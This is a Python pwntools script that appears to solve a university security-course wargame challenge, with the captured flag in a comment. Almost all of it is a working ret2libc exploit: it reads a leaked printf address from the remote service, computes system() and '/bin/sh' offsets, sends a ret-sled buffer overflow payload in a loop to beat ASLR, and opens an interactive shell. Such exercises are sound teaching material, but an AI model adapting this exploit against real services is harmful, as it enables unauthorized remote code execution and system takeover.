#!/usr/bin/env python
# -*- encoding: utf-8 -*-

# flag: 6447{38b126bc-24b0-404d-81db-7a2f74ea4941}

from pwn import *

GDB_CMDS = ""

def main():
    context.terminal = "/bin/sh"
    h = "wargames.6447.sec.edu.au"
    p = 8001

    ret_address = 0x08048199
    r_char = "\x08" # use a semi-random char and hope aslr treats you well

    i = 0
    while 1:
        i += 1
        print i

        r = remote( h, p )

        r.recvuntil("random number: ")
        resp = r.recvline().strip()
        print resp

        printf_address = int(resp, 16)
        system_address = printf_address - 0xe8d0
        bin_sh_string_add = printf_address + 0x11239b

        payload = p32(ret_address) * 34 + p32(system_address) + p32(bin_sh_string_add) * 2 + r_char

        r.send(payload)
        resp = r.recvrepeat(0.4)
        print resp

        r.interactive()
        r.close()

if __name__ == '__main__':
    main()
